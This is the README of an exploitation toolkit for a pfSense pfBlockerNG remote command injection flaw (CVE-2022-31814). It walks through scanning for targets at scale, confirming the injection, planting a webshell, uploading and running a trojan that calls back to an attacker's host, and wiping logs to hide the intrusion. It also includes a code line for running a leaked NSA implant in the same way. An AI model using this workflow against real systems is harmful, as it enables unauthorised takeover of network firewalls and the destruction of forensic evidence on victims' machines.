# SenselessViolence
CVE-2022-31814 (pfSense pfBlockerNG <= 2.1.4_26) Exploitation Toolkit.

## What?
This is an exploitation toolkit for the pfSense pfBlockerNG <= 2.1.4_26 plugins remote command injection feature discovered by IHTeam.

I wrote this to play around with some of the design principles found in the NSA's firewall exploitation toolkit - for this reason, its designed to be fully compatible with the nopen implant (one small, and documented, change needed), have built-in log wiping features, and be extremely reliable by implementing some pre-flight checks (passive and active vulnerability tests). 

A trivial reverse TTY shell payload written in Python (these things ship with a Python interpreter) is supplied as a surrogate for nopen in this toolkit, because running sketchy binaries swiped from the NSA seems a tad foolish in production environments. 

## How to Use?
For yolo-scanning for beg bounties and mass-exploitation, run the nuclei template supplied (it should also have been upstreamed by now). This will give you a target list. This file is named `nuclei-CVE-2022-31814.yaml`.


### Modes 

For precision carefulling of networks, there are four "modes" you will want to be aware of, and are documented below. Run them in order. These are set using the "--mode" flag.

- touch 
- probe
- exploit
- cleanup

#### touch
This mode makes two HTTP requests - one to check its actually a pfSense (by checking the HTTP title on /), and one to the vulnerable endpoint to check it looks ok. This mode does not exploit anything. 

#### probe
This mode makes two HTTP requests - both of which exploit the vulnerability. 

It injects a `sleep 1` and a `sleep 10` and makes sure the time difference between both requests is greater than 6 seconds. 

I added a bit of fuckit factor into this to account for latency if you are pitching the exploit over a proxy (you are, right?).

#### exploit
This mode makes 3 HTTP requests. 

The first exploits the vulnerability to drop a webshell using a GET request.  
The second uses the webshell to upload our trojan using a POST request.  
The third uses the webshell to execute our trojan using a POST request.

#### cleanup

This mode makes two HTTP requests.  
The first uploads a cleanup script using the webshell.  
The second executes the cleanup script.  

The cleanup script zaps the logs, deletes the trojan, deletes the webshell, and then deletes itself. It does this in a reasonable manner (rm -rf). Not particularly forensically sound - I may fix that later by using `dd` to overwrite the files before deleting. I may also write some sed magic to surgically zap the logs, but really, only if I can be fucked. 

### Other arguments

- trojan - path to your trojan executable/script
- cbhost - callback host for trojan
- cbport - callback port for trojan
- target - target base url, eg: https://pfsense.local
- interact - spawns a shitty pseudo shell using the webshell in case you want to run commands, transfer files, etc via the webshell. May not be implemented in the initial public release (its buggy as shit)
- help (prints a help menu)

### Making it work with nopen.

For nopen use, just replace the final "execute trojan" command in the `exploit()` function with the following:

```
    execute_command(base_url, shell_webpath, shell_param, shell_command=f"chmod +x /tmp/.troy;D=-c{connectback_host}:{connectback_port} /tmp/.troy")
```

And supply a freebsd nopen (noserver) binary that works on your target system - this may be difficult, you need to patch the `noserver-3.3.2.3-freebsd_8.0-i386` from the EQGRP leak to use `libkvm.so.7` instead of `libkvm.so.5`, and the target system needs the lib32 compat layer... Which doesn't ship by default in pfSense.

I might add a `--nopen` flag to automagic this in a later release, if people *really* care that much to use nopen. They shouldn't.

## Screenshot of it in action (showing the logs are sparkly clean).
![screenshot](https://github.com/EvergreenCartoons/SenselessViolence/blob/main/Screenshot%20from%202022-09-18%2016-03-39.png?raw=true)

## References
IHTeam Advisory: https://www.ihteam.net/advisory/pfblockerng-unauth-rce-vulnerability/
